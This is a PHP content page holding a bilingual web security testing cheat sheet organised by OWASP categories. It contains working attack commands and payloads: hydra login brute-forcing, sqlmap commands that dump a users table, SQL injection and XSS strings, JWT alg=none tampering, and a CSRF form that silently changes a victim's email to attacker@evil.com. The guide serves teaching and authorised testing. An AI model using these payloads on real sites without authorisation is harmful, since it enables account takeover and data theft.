<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'Testing de Seguridad Web — CyberEscudo' : 'Web Security Testing — CyberEscudo';
$contentTitle = $lang==='es' ? 'Testing de Seguridad Web' : 'Web Security Testing';
$contentDate  = '2022-04-28';
$contentTags  = ['OWASP','Testing','Burp Suite','DAST','Seguridad Web'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p>Guía de <strong>testing de seguridad web</strong> basada en la metodología OWASP, cubriendo las pruebas más importantes para cada categoría del Top 10.</p>

  <h2>1. Reconocimiento de la aplicación</h2>
  <pre><code># Descubrir tecnologías:
whatweb http://target.com
wappalyzer (extensión navegador)

# Mapear la aplicación (spider):
# Burp Suite → Target → Site map → Espider the application

# Buscar endpoints ocultos:
gobuster dir -u http://target.com -w big.txt -x php,html,js
# Revisar robots.txt y sitemap.xml:
curl http://target.com/robots.txt
curl http://target.com/sitemap.xml</code></pre>

  <h2>2. Testing de Autenticación</h2>
  <pre><code># 1. Fuerza bruta al login:
hydra -l admin -P rockyou.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"

# 2. Enumeración de usuarios (timing attack):
# Medir el tiempo de respuesta para usuarios válidos vs inválidos

# 3. Contraseñas por defecto:
admin:admin | admin:password | root:root | test:test

# 4. Verificar bloqueo de cuenta tras intentos fallidos:
# ¿Se bloquea después de 5 intentos?

# 5. Token JWT (si se usa):
# Decodificar en https://jwt.io/
# Probar algoritmo "none": cambiar alg a "none" y eliminar firma</code></pre>

  <h2>3. Testing de Autorización (IDOR)</h2>
  <pre><code># Insecure Direct Object Reference:
# Cambiar IDs en la URL para acceder a recursos de otros usuarios:
GET /api/users/1/profile   → cambiar a /api/users/2/profile
GET /download?file=invoice_001.pdf → cambiar a invoice_002.pdf

# Escalada de privilegios horizontal y vertical:
# Acceder a funciones de admin siendo usuario normal
# Intercept con Burp y modificar rol/ID en la petición</code></pre>

  <h2>4. Testing de SQL Injection</h2>
  <pre><code># Detección manual — añadir en cada parámetro:
'           → error SQL = vulnerable
' OR '1'='1 → devuelve todos los registros
' AND '1'='2 → no devuelve resultados

# Automático con SQLMap:
sqlmap -u "http://target.com/search?q=1" --dbs
sqlmap -u "http://target.com/search?q=1" -D dbname --tables
sqlmap -u "http://target.com/search?q=1" -D dbname -T users --dump

# Parámetros POST:
sqlmap -u "http://target.com/login" --data="user=1&pass=1" --dbs</code></pre>

  <h2>5. Testing de XSS</h2>
  <pre><code># Payloads básicos de detección:
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;
"&gt;&lt;script&gt;alert(1)&lt;/script&gt;

# XSS en cabeceras HTTP (Referer, User-Agent):
# Burp → modificar cabecera con payload

# Stored XSS:
# Publicar comentario/perfil con payload → ¿se ejecuta al cargar la página?

# DOM-based XSS:
# Buscar parámetros usados en document.write(), innerHTML, eval()</code></pre>

  <h2>6. Testing de CSRF</h2>
  <pre><code"># 1. Identificar acciones sensibles (cambio de contraseña, transferencias)
# 2. Interceptar la petición con Burp
# 3. ¿Hay token CSRF? ¿Se valida?
# 4. Crear PoC:
&lt;form action="http://target.com/change-email" method="POST"&gt;
  &lt;input name="email" value="atacante@evil.com"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>

  <h2>7. Testing de cabeceras de seguridad</h2>
  <pre><code># Verificar con curl:
curl -I https://target.com

# Cabeceras que deben estar presentes:
# ✓ Strict-Transport-Security
# ✓ X-Content-Type-Options: nosniff
# ✓ X-Frame-Options: DENY o SAMEORIGIN
# ✓ Content-Security-Policy
# ✗ Server: (debe estar oculto o ser genérico)
# ✗ X-Powered-By: (debe estar oculto)

# Herramienta online:
# https://securityheaders.com/</code></pre>

  <h2>8. Testing de SSL/TLS</h2>
  <pre><code"># Con testssl.sh:
./testssl.sh https://target.com

# Con nmap:
nmap --script ssl-enum-ciphers -p 443 target.com

# Comprobar:
# ✓ TLS 1.2 y 1.3 activos
# ✗ SSL 2.0, SSL 3.0, TLS 1.0, TLS 1.1 desactivados
# ✗ Ciphers débiles (RC4, DES, 3DES, EXPORT)
# ✓ Certificado válido y no expirado</code></pre>
</div>
<?php else: ?>
<div class="prose">
  <p>Web security testing guide based on OWASP methodology, covering key tests for each Top 10 category.</p>

  <h2>1. Application Recon</h2>
  <pre><code>whatweb http://target.com
gobuster dir -u http://target.com -w big.txt -x php,html,js
curl http://target.com/robots.txt</code></pre>

  <h2>2. Authentication Testing</h2>
  <pre><code>hydra -l admin -P rockyou.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"
# Default creds: admin:admin | root:root | test:test
# JWT: decode at jwt.io, try alg=none attack</code></pre>

  <h2>3. Authorisation / IDOR</h2>
  <pre><code>GET /api/users/1/profile  → change to /api/users/2/profile
GET /download?file=invoice_001.pdf → invoice_002.pdf</code></pre>

  <h2>4. SQL Injection</h2>
  <pre><code>'              # SQL error = vulnerable
' OR '1'='1   # Returns all records
sqlmap -u "http://target.com/search?q=1" --dbs</code></pre>

  <h2>5. XSS</h2>
  <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;</code></pre>

  <h2>6. CSRF</h2>
  <pre><code>&lt;form action="http://target.com/change-email" method="POST"&gt;
  &lt;input name="email" value="attacker@evil.com"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>

  <h2>7. Security Headers</h2>
  <pre><code>curl -I https://target.com
# Check: Strict-Transport-Security, X-Content-Type-Options,
# X-Frame-Options, Content-Security-Policy
# Verify at: https://securityheaders.com/</code></pre>

  <h2>8. SSL/TLS</h2>
  <pre><code>nmap --script ssl-enum-ciphers -p 443 target.com
# Verify: TLS 1.2/1.3 enabled | TLS 1.0/1.1/SSL disabled
# Check at: https://www.ssllabs.com/ssltest/</code></pre>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';
